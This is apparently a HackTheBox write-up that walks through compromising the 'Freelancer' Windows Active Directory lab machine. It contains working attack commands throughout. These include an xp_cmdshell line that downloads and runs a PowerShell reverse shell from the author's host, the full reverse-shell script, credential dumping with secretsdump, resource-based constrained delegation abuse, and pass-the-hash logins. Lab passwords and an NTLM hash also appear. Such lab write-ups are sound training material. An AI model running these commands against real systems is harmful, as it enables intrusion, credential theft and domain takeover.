---
title: "Freelancer Writeup - HackTheBox"
date: 2024-10-11
draft: false
Tags:
- HackTheBox
- Windows
- Hard
---

| Link: | [https://app.hackthebox.com/machines/Freelancer](https://app.hackthebox.com/machines/Freelancer) |
| --- | --- |
| Difficulty | Hard |
| Machine | Windows |

---

## Enumeration

I ran nmap quickly to find open ports using: `nmap 10.10.11.5 -T4 -vv`

```
PORT     STATE SERVICE          REASON
53/tcp   open  domain           syn-ack
80/tcp   open  http             syn-ack
88/tcp   open  kerberos-sec     syn-ack
135/tcp  open  msrpc            syn-ack
139/tcp  open  netbios-ssn      syn-ack
389/tcp  open  ldap             syn-ack
445/tcp  open  microsoft-ds     syn-ack
464/tcp  open  kpasswd5         syn-ack
593/tcp  open  http-rpc-epmap   syn-ack
636/tcp  open  ldapssl          syn-ack
3268/tcp open  globalcatLDAP    syn-ack
3269/tcp open  globalcatLDAPssl syn-ack
```

With this open ports, I did agressive nmap scan using: `sudo nmap 10.10.11.5 -T4 -vv -p53,80,88,135,139,389,445,464,593,636,3268,3269 -A -sC -sV -O`

```
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 nginx 1.25.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://freelancer.htb/
|_http-server-header: nginx/1.25.5
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-06-04 10:13:26Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=6/4%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=665EA414%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10D%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4h53m57s
| smb2-time: 
|   date: 2024-06-04T10:13:40
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53827/tcp): CLEAN (Timeout)
|   Check 2 (port 56435/tcp): CLEAN (Timeout)
|   Check 3 (port 55524/udp): CLEAN (Timeout)
|   Check 4 (port 39076/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

I added the freelancer.htb to /etc/hosts to make sure the site loads using `echo "10.10.11.5 freelancer.htb" >> /etc/hosts`

This is how the freelancer site looks:

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled.png)

In this site, we can create account for employer or freelancer.

I created a freelancer user with following details:

```
--> freelancer info <--
freelancer_rezy > username
mail@gmail.com > email
```

I will also create a account of employeer with following details:

```
--> employer info <---
employercoo_l > username
erezrrrr1@gmail.com > email
sdlhjkgbfdjksjkskjsdhjkfs > password
fav movie > spiderman
pet > dog
friend's name > john
```

The site has note that, after creating account for employer we aren’t able to login as it will be reviewed before it is activated.

I used the forget password functionality to change the password of the account employer to see if it allows us to login once we change the password. If yes the backend code has logic errors.

It worked and I changed the existing password to `spiderman123!` I tried to login with this new password, and it worked. I no more had to wait for review before accessing the site.

Looking around the website, and my eye was caught this QR code.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%201.png)

So this link can let us login without using credentials.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%202.png)

The link is in the format: where the base64 encoded is just the userID and MD5 Hash is the token. Hash changes every 5 minutes or everytime we logout and relogin.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%203.png)

From here I see that I can login to any user through this link as long as I know the id of the user I need to login, and the md5 token will be changed after each login.

We need to enumerate the userID of admin or any other user who might have any higher permission than what we have right now.

I also found a comment to enumerate the users in this web app. 

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%204.png)

I fuzzed the userId in this link: `http://freelancer.htb/accounts/profile/visit/$userID$/` and found that ID 2 = admin user.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%205.png)

Now, I will use the userID to login to user admin.

## User Flag

I visited the link: `http://freelancer.htb/accounts/login/otp/Mg==/6c5f75d2ed26ceec004a2f5eb155fcfd/` to login to user admin. Here `Mg==` is the base64 encoded form of “2”. And the md5 hash is just the token given from QR. I didn’t change it.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%206.png)

After exploring a bit, I found nothing. Then I used gobuster to bruteforce the website and found `/admin` endpoint. As i am already the user admin, I was able to access it:

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%207.png)

Here, there is SQL Terminal in this admin endpoint. We can maybe try executing a code to get reverse shell from here.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%208.png)

As it is Windows box, it is most likely MSSQL. So, I will use the rev shelll script from: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands

First I used to impersonate as user System Admin. ([https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#impersonation-of-other-users))

```
EXECUTE AS LOGIN = 'sa'
```

Then,

```
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

EXEC master..xp_cmdshell 'whoami'
```

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%209.png)

I can see it is sql_svc account. 

Now, I ran: 

```
EXECUTE xp_cmdshell 'powershell -c iex(iwr -usebasicparsing http://10.10.14.72:8000/revshell.ps1)'
```

This downloads the reverse shell powershell script from my kali machine to target machine.

The script contents the following script:

```powershell
do {
	Start-Sleep -Seconds 1
	
	try {
		$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.72', 8888)
	} catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

function WriteToStream ($String) {
	[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
	
	$StreamWriter.Write($String + 'H3K3R-SHELL[#]> ')
	$StreamWriter.Flush()
}

WriteToStream ''

while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
	$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
	
	$Output = try {
		Invoke-Expression $Command 2>&1 | Out-String
	} catch {
		$_ | Out-String
	}	
	
	WriteToStream ($Output)
}

$StreamWriter.Close()
```

We get a reverse shell now:

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2010.png)

At users directory, i can see users in this box:

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2011.png)

As i am sql_svc user, I will try to enumerate the user sql_svc to see if there is anything interesting.

At Directory: `C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU`

There are following files:

```
Directory: C:\Users\sql_svc\Downloads\SQLEXPR-2019_x64_ENU

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        5/27/2024   1:52 PM                1033_ENU_LP                                                           
d-----        5/27/2024   1:52 PM                redist                                                                
d-----        5/27/2024   1:52 PM                resources                                                             
d-----        5/27/2024   1:52 PM                x64                                                                   
-a----        9/24/2019   9:00 PM             45 AUTORUN.INF                                                           
-a----        9/24/2019   9:00 PM            784 MEDIAINFO.XML                                                         
-a----        9/29/2023   4:49 AM             16 PackageId.dat                                                         
-a----        9/24/2019   9:00 PM         142944 SETUP.EXE                                                             
-a----        9/24/2019   9:00 PM            486 SETUP.EXE.CONFIG                                                      
-a----        5/27/2024   4:58 PM            724 sql-Configuration.INI                                                 
-a----        9/24/2019   9:00 PM         249448 SQLSETUPBOOTSTRAPPER.DLL                                              

```

Where, `sql-Configuration.INI` file contains the following configurations:

```
SHELL> cat sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="FREELANCER\sql_svc"
SQLSVCPASSWORD="IL0v3ErenY3ager"
```

Here, `SQLSVCPASSWORD="IL0v3ErenY3ager"` is a password revealed. I will try to pass this password using crackmapexec to the users that were in users directory.

```
┌──(kali㉿kali)-[~/htb/freelancer]
└─$ crackmapexec smb 10.10.11.5 -u users.txt -p IL0v3ErenY3ager 
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\Administrator:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lkazanof:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [-] freelancer.htb\lorra199:IL0v3ErenY3ager STATUS_LOGON_FAILURE 
SMB         10.10.11.5      445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
```

As we can see the password for the user `mikasaAckerman` is `IL0v3ErenY3ager`.

Now, I will upload runasCs to the box and try to inject the above credentials to the memory.

To upload runascs to my target machine, i will use command: `Invoke-WebRequest "http://10.10.14.72:8000/RunasCs.exe" -OutFile "runascs.exe"`  to my current `SHELL>` session.

I ran `nc -nvlp 6969` then ran `./runascs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.72:6969` on my current windows rev shell.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2012.png)

I see myself as mikasaAckerman user. And the desktop of this user contains the user flag.

## Root Flag

In the desktop of mikasaAckerman, alongside user.txt there is also mail.txt which contains:

```
Hello Mikasa,
I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you know, the problem started occurring after we installed the new update of SQL Server 2019.
I attempted the solutions you provided in your last email, but unfortunately, there was no improvement. Whenever we try to establish a remote SQL connection to the installed instance, the server's CPU starts overheating, and the RAM usage keeps increasing until the BSOD appears, forcing the server to restart.
Nevertheless, Liza has requested me to generate a full memory dump on the Datacenter and send it to you for further assistance in troubleshooting the issue.
Best regards,
```

There is also MEMORY.7Z here. I downloaded the 7z file from windows box to my linux machine using python impacket smb server. 

First I opened a smb server using command: `impacket-smbserver share . -smb2support -user rezy -password rezy`. And then mounted the share using:

```
$SharePath = "\\10.10.14.72\share"
$Username = "rezy"
$Password = "rezy"

# Create a credential object
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, (ConvertTo-SecureString -String $Password -AsPlainText -Force)

# Mount the SMB share
net use Z: $SharePath $Password /user:$Username /persistent:no
```

This will mount the smb share from linux to windows. Then to confirm I can do this:

```
PS C:\Users\mikasaAckerman\Desktop> Get-PSDrive

Name           Used (GB)     Free (GB) Provider      Root                                                                                                                                                                                 CurrentLocation
----           ---------     --------- --------      ----                                                                                                                                                                                 ---------------
Alias                                  Alias
C                  13.67          1.79 FileSystem    C:\                                                                                                                                                                    Users\Administrator\Documents
Cert                                   Certificate   \
Env                                    Environment
Function                               Function
HKCU                                   Registry      HKEY_CURRENT_USER
HKLM                                   Registry      HKEY_LOCAL_MACHINE
Variable                               Variable
WSMan                                  WSMan
Z          ...3478272.00          0.00 FileSystem    \\10.10.14.72\share
```

As we can see it’s Z drive. I can simply run:

```
Copy-Item -Path "C:\Users\mikasaAckerman\Desktop\MEMORY.7z" -Destination "Z:\"
```

to transfer file to the smb share and we can access it from our kali box.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2013.png)

I then, used https://github.com/ufrisk/MemProcFS to dump the file and mount it.

I found the SAM, SYSTEM and SECURITY files in registry/hive_files. I Dumped it with secretsdump and I get a password: `PWN3D#l0rr@Armessa199` which is a password for the user `lorra199`

I will login to it using `evil-winrm -i freelancer.htb -u lorra199 -p PWN3D#l0rr@Armessa199`

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2014.png)

Now, we need to syncronize the server time. 

```
┌──(root㉿kali)-[/home/kali]
└─# ntpdate -u freelancer.htb 
2024-06-06 09:45:20.815434 (-0400) +17631.477286 +/- 0.038578 freelancer.htb 10.10.11.5 s1 no-leap
CLOCK: time stepped by 17631.477286
```

17631.477286 seconds is around 5 hours. So, I ran:

```
┌──(root㉿kali)-[/home/kali]
└─# faketime -f +5h bloodhound-python -c ALL -u lorra199 -p 'PWN3D#l0rr@Armessa199' -d freelancer.htb -ns 10.10.11.5
INFO: Found AD domain: freelancer.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.freelancer.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.freelancer.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 13 computers
INFO: Connecting to LDAP server: dc.freelancer.htb
INFO: Found 30 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: SetupMachine.freelancer.htb
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: Datacenter-2019
INFO: Querying computer: DC.freelancer.htb
WARNING: Could not resolve: Datacenter-2019: The resolution lifetime expired after 3.104 seconds: Server Do53:10.10.11.5@53 answered The DNS operation timed out.
INFO: Done in 00M 17S
```

This generated json files in the directory where we ran the command. This will be the file we will upload it to bloodhound and enumerate it to find path to root.

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2015.png)

If you see the image above, lorra199 is member of AD REcycle bin group which has generic write permission to DC2.

So we can perform Resource Based **Constrained Delegation,** Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against a **service** of a machine.

I will now run, 

```
┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer -computer-name 'HEKER$' -computer-pass 'Heker123@!' -dc-host freelancer.htb -domain-netbios freelancer.htb freelancer.htb/lorra199:'PWN3D#l0rr@Armessa199' 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Successfully added machine account HEKER$ with password Heker123@!.
```

The `impacket-addcomputer` command is used to add a computer account to a domain

Now we will use impacket rbcd to delegate:

```
impacket-rbcd -delegate-from 'HEKER$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
```

- `delegate-from 'HEKER$'`: Specifies the computer account that will delegate permissions. In this case, it's "HEKER$".
- `delegate-to 'DC$'`: Specifies the computer account that will receive the delegated permissions. In this case, it's "DC$".
- `dc-ip 10.10.11.5`: Specifies the IP address of the domain controller. In this case, it's "10.10.11.5".
- `action 'write'`: Specifies the action to be taken. In this case, it's "write", which means it will write the delegation settings.
- `'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'`: Specifies the domain and credentials used to authenticate. In this case, it's the "freelancer.htb" domain, with the username "lorra199" and password "PWN3D#l0rr@Armessa199".

```
┌──(kali㉿kali)-[~]
└─$ impacket-rbcd -delegate-from 'HEKER$' -delegate-to 'DC$' -dc-ip 10.10.11.5 -action 'write' 'freelancer.htb/lorra199:PWN3D#l0rr@Armessa199'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Accounts allowed to act on behalf of other identity:
[*]     rbcd_account$   (S-1-5-21-3542429192-2036945976-3483670807-11604)
[*]     parrot$      (S-1-5-21-3542429192-2036945976-3483670807-11601)
[*]     BIGNAMEMUST$   (S-1-5-21-3542429192-2036945976-3483670807-11605)
[*]     ATTACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11603)
[*]     WINGER$      (S-1-5-21-3542429192-2036945976-3483670807-11606)
[*]     WINGERABCDEFG$   (S-1-5-21-3542429192-2036945976-3483670807-11607)
[*]     ATTATTATTATTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11608)
[*]     HACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11609)
[*] Delegation rights modified successfully!
[*] HEKER$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     rbcd_account$   (S-1-5-21-3542429192-2036945976-3483670807-11604)
[*]     parrot$      (S-1-5-21-3542429192-2036945976-3483670807-11601)
[*]     BIGNAMEMUST$   (S-1-5-21-3542429192-2036945976-3483670807-11605)
[*]     ATTACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11603)
[*]     WINGER$      (S-1-5-21-3542429192-2036945976-3483670807-11606)
[*]     WINGERABCDEFG$   (S-1-5-21-3542429192-2036945976-3483670807-11607)
[*]     ATTATTATTATTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11608)
[*]     HACKERSYSTEM$   (S-1-5-21-3542429192-2036945976-3483670807-11609)
[*]     HEKER$       (S-1-5-21-3542429192-2036945976-3483670807-11610)
```

Now we can see we are able to act on behalf of other identity. Now i will use impcket to get service ticket from dc.

```
faketime -f +5h impacket-getST -spn 'cifs/dc.freelncer.htb' -impersonate Administrator -dc-ip 10.10.11.5 freelancer.htb/HEKER$:'Heker123@!'
```

![Untitled](Freelancer%20ddb658cf8b564ba0b3c161a2c4e057cb/Untitled%2016.png)

i will now import the ticket and use secretsdump to get the hash of admin account.

To import the ticket, I will simply do `export KRB5CCNAME=Administrator.ccache` and run the following command:

```
faketime -f +5h impacket-secretsdump 'freelancer.htb/Administrator@DC.freelancer.htb' -k -no-pass -dc-ip 10.10.11.5 -target-ip 10.10.11.5 -just-dc-ntlm
```

We will recieve Hash for user accounts in this DC along with Administrator’s. Now, i will simply use the hash of Administrator and pass the hash with evil-winrm to get access to root account.

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i freelancer.htb -u administrator -H 0039318f1e8274633445bce32ad1a290
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
freelancer\administrator
```

As you can see, we got to administrator as well and got root flag too.

## Conclusion

Thanks for following my walk-through on this fun AD box.
